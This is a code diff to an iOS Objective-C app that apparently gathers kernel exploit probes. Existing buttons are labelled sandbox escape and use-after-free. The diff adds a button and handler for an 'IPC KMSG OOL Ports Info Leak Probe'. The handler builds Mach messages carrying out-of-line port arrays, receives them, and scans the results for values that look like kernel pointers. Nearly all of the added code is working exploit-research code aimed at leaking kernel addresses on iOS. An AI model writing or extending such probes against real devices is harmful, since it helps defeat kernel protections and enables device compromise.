@@ -218,6 +218,7 @@ static const char kOpenPropertiesGarbage[] =
 @property (nonatomic, strong) UIButton   *sandboxEscapeButton;
 @property (nonatomic, strong) UIButton   *appIntentButton;
 @property (nonatomic, strong) UIButton   *scalerUAFButton;
+@property (nonatomic, strong) UIButton   *ipcKmsgButton;
 @property (nonatomic, strong) UITextView *logView;
 @property (nonatomic, assign) int  proofCrossClientEvents;
 @property (nonatomic, assign) int  proofCrossClientChecks;
@@ -311,6 +312,7 @@ static const char kOpenPropertiesGarbage[] =
 - (void)iohidUAFTapped;
 - (void)runIOHIDUAFProbe;
 - (void)sandboxEscapeTapped;
+- (void)ipcKmsgTapped;
 @end
 
 // =======================================================================
@@ -806,6 +808,15 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self.scalerUAFButton addTarget:self action:@selector(scalerUAFTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.scalerUAFButton];
 
+    self.ipcKmsgButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.ipcKmsgButton.translatesAutoresizingMaskIntoConstraints = NO;
+    UIButtonConfiguration *ipcConf = [UIButtonConfiguration filledButtonConfiguration];
+    ipcConf.baseBackgroundColor = [UIColor systemTealColor];
+    self.ipcKmsgButton.configuration = ipcConf;
+    [self.ipcKmsgButton setTitle:@"IPC KMSG Leak Probe (v1)" forState:UIControlStateNormal];
+    [self.ipcKmsgButton addTarget:self action:@selector(ipcKmsgTapped) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.ipcKmsgButton];
+
     self.logView = [[UITextView alloc] initWithFrame:CGRectZero];
     self.logView.translatesAutoresizingMaskIntoConstraints = NO;
     self.logView.editable = NO;
@@ -843,7 +854,10 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self.scalerUAFButton.topAnchor constraintEqualToAnchor:self.appIntentButton.bottomAnchor constant:12],
         [self.scalerUAFButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
         [self.scalerUAFButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
-        [self.logView.topAnchor constraintEqualToAnchor:self.scalerUAFButton.bottomAnchor constant:20],
+        [self.ipcKmsgButton.topAnchor constraintEqualToAnchor:self.scalerUAFButton.bottomAnchor constant:12],
+        [self.ipcKmsgButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
+        [self.ipcKmsgButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
+        [self.logView.topAnchor constraintEqualToAnchor:self.ipcKmsgButton.bottomAnchor constant:20],
         [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
         [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
         [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
@@ -8470,6 +8484,195 @@ static void *iohid_threadCopyEvent(void *arg) {
     sIOObjectRelease(svc);
     [self appendLog:@"\nDone. If no crash, check later panic logs for x9 register."];
     while (1) { sleep(5); [self appendLog:@"  alive..."]; }
+}
+
+- (void)ipcKmsgTapped {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        [self appendLog:@"\n=== IPC KMSG OOL Ports Info Leak Probe ==="];
+
+        kern_return_t kr;
+
+        // Step 1: Create multiple ports for OOL array
+        // Each slot needs a real port right so kernel copies non-null pointers
+        const mach_msg_size_t PORT_COUNT = 8;
+        mach_port_t ports[PORT_COUNT];
+        memset(ports, 0, sizeof(ports));
+        for (mach_msg_size_t i = 0; i < PORT_COUNT; i++) {
+            kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
+            if (kr != KERN_SUCCESS) {
+                [self appendLog:[NSString stringWithFormat:
+                    @"port_allocate[%d] failed: %s (0x%x)", i, mach_error_string(kr), kr]];
+                for (mach_msg_size_t j = 0; j < i; j++) {
+                    mach_port_destroy(mach_task_self(), ports[j]);
+                }
+                return;
+            }
+            kr = mach_port_insert_right(mach_task_self(), ports[i], ports[i],
+                MACH_MSG_TYPE_MAKE_SEND);
+            if (kr != KERN_SUCCESS) {
+                [self appendLog:[NSString stringWithFormat:
+                    @"insert_right[%d] failed: %s (0x%x)", i, mach_error_string(kr), kr]];
+                for (mach_msg_size_t j = 0; j <= i; j++) {
+                    mach_port_destroy(mach_task_self(), ports[j]);
+                }
+                return;
+            }
+        }
+        [self appendLog:[NSString stringWithFormat:
+            @"Created %d ports with send rights", PORT_COUNT]];
+
+        // Create dedicated receive port for this message
+        mach_port_t recvPort = MACH_PORT_NULL;
+        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recvPort);
+        if (kr != KERN_SUCCESS) {
+            [self appendLog:[NSString stringWithFormat:
+                @"recv port alloc: %s", mach_error_string(kr)]];
+            for (int j = 0; j < PORT_COUNT; j++) mach_port_destroy(mach_task_self(), ports[j]);
+            return;
+        }
+        kr = mach_port_insert_right(mach_task_self(), recvPort, recvPort,
+            MACH_MSG_TYPE_MAKE_SEND);
+
+        // Step 2: Build OOL ports descriptor message
+        mach_port_t *oolArray = (mach_port_t *)calloc(PORT_COUNT, sizeof(mach_port_t));
+        for (mach_msg_size_t i = 0; i < PORT_COUNT; i++) {
+            oolArray[i] = ports[i]; // send rights
+        }
+
+        struct __attribute__((__packed__)) {
+            mach_msg_header_t               header;
+            mach_msg_body_t                 body;
+            mach_msg_ool_ports_descriptor_t ool;
+        } sendMsg;
+
+        memset(&sendMsg, 0, sizeof(sendMsg));
+        sendMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
+                                    | MACH_MSGH_BITS_COMPLEX;
+        sendMsg.header.msgh_remote_port = recvPort;
+        sendMsg.header.msgh_local_port  = MACH_PORT_NULL;
+        sendMsg.header.msgh_size        = sizeof(sendMsg);
+        sendMsg.header.msgh_id          = 0x4B4D53;
+
+        sendMsg.body.msgh_descriptor_count = 1;
+        sendMsg.ool.address     = oolArray;
+        sendMsg.ool.count       = PORT_COUNT;
+        sendMsg.ool.deallocate  = FALSE;
+        sendMsg.ool.copy        = MACH_MSG_VIRTUAL_COPY;
+        sendMsg.ool.disposition = MACH_MSG_TYPE_COPY_SEND;
+        sendMsg.ool.type        = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+
+        // Step 3: Send the message to ourselves
+        kr = mach_msg(&sendMsg.header,
+                      MACH_SEND_MSG,
+                      sendMsg.header.msgh_size,
+                      0,
+                      MACH_PORT_NULL,
+                      MACH_MSG_TIMEOUT_NONE,
+                      MACH_PORT_NULL);
+        [self appendLog:[NSString stringWithFormat:
+            @"send: %s (0x%x)", mach_error_string(kr), kr]];
+
+        if (kr != KERN_SUCCESS) {
+            free(oolArray);
+            mach_port_destroy(mach_task_self(), recvPort);
+            for (int j = 0; j < PORT_COUNT; j++) mach_port_destroy(mach_task_self(), ports[j]);
+            return;
+        }
+
+        // Step 4: Receive the message
+        struct __attribute__((__packed__)) {
+            mach_msg_header_t               header;
+            mach_msg_body_t                 body;
+            mach_msg_ool_ports_descriptor_t ool;
+            mach_msg_trailer_t              trailer;
+        } recvMsg;
+
+        memset(&recvMsg, 0, sizeof(recvMsg));
+        recvMsg.header.msgh_local_port = recvPort;
+        recvMsg.header.msgh_size       = sizeof(recvMsg);
+
+        kr = mach_msg(&recvMsg.header,
+                      MACH_RCV_MSG | MACH_RCV_LARGE,
+                      0,
+                      sizeof(recvMsg),
+                      recvPort,
+                      MACH_MSG_TIMEOUT_NONE,
+                      MACH_PORT_NULL);
+        [self appendLog:[NSString stringWithFormat:
+            @"recv: %s (0x%x)", mach_error_string(kr), kr]];
+
+        // Step 5: Analyze received port array
+        if (kr == KERN_SUCCESS) {
+            mach_port_t *recvArray = (mach_port_t *)recvMsg.ool.address;
+            mach_msg_size_t recvCount = recvMsg.ool.count;
+
+            NSMutableString *report = [NSMutableString string];
+            [report appendFormat:@"\nReceived %d port names at %p:\n\n", recvCount, recvArray];
+
+            // Raw hex dump
+            const uint8_t *raw = (const uint8_t *)recvArray;
+            [report appendString:@"Raw hex (first 64 bytes):\n  "];
+            for (int i = 0; i < MIN(64, (int)(recvCount * sizeof(mach_port_t))); i++) {
+                [report appendFormat:@"%02x ", raw[i]];
+                if ((i + 1) % 16 == 0) [report appendString:@"\n  "];
+                else if ((i + 1) % 8 == 0) [report appendString:@" "];
+            }
+            [report appendString:@"\n\n"];
+
+            // Individual port names
+            int leakCount = 0;
+            [report appendString:@"Port name scan:\n"];
+            for (mach_msg_size_t j = 0; j < recvCount; j++) {
+                mach_port_t val = recvArray[j];
+                [report appendFormat:@"[%2d] 0x%08x", j, val];
+
+                uint32_t high = val >> 20;
+                if (high == 0xfffff || high == 0xffffe) {
+                    [report appendString:@" <-- HIGH32 kernel ptr?"];
+                    leakCount++;
+                } else if (val > 0x80000000 && val != 0xFFFFFFFF) {
+                    [report appendString:@" <-- suspicious"];
+                    leakCount++;
+                } else if (val == 0) {
+                    [report appendString:@" (null)"];
+                }
+                [report appendString:@"\n"];
+            }
+
+            // 64-bit pair analysis
+            [report appendString:@"\n64-bit pair scan:\n"];
+            for (mach_msg_size_t j = 0; j < recvCount - 1; j += 2) {
+                uint64_t pair = ((uint64_t)recvArray[j]) | ((uint64_t)recvArray[j+1] << 32);
+                if ((pair >> 40) == 0xfffffe || (pair >> 40) == 0xffffff) {
+                    [report appendFormat:@"  [%d|%d] 0x%016llx <-- KERNEL POINTER!\n", j, j+1, pair];
+                    leakCount++;
+                }
+                uint64_t pair2 = ((uint64_t)recvArray[j+1]) | ((uint64_t)recvArray[j] << 32);
+                if ((pair2 >> 40) == 0xfffffe || (pair2 >> 40) == 0xffffff) {
+                    [report appendFormat:@"  [%d|%d] 0x%016llx <-- KERNEL POINTER!\n", j+1, j, pair2);
+                    leakCount++;
+                }
+            }
+
+            [report appendFormat:@"\nLeak candidates: %d\n", leakCount];
+            [self appendLog:report];
+
+            // Cleanup received OOL mapping
+            if (recvMsg.ool.address) {
+                vm_deallocate(mach_task_self(), (vm_address_t)recvMsg.ool.address,
+                              recvMsg.ool.count * sizeof(mach_port_t));
+            }
+        }
+
+        // Cleanup
+        free(oolArray);
+        mach_port_destroy(mach_task_self(), recvPort);
+        for (int j = 0; j < PORT_COUNT; j++) {
+            mach_port_destroy(mach_task_self(), ports[j]);
+        }
+
+        [self appendLog:@"=== IPC KMSG Probe complete ==="];
+    });
 }
 
 @end
